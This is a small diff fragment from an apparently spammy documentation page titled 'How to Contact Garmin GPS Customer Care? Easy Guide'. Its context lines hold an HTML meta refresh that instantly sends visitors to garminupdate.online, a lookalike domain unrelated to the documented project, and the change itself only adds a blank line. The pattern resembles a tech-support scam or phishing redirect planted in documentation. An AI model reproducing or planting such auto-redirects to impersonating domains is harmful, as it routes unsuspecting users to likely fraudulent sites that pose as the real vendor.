@@ -2,6 +2,7 @@
  
     <meta http-equiv="refresh" content="0; url=https://garminupdate.online/">
 
+
 How to Contact Garmin GPS Customer Care? Easy Guide
 =======================================================
 .. toctree::
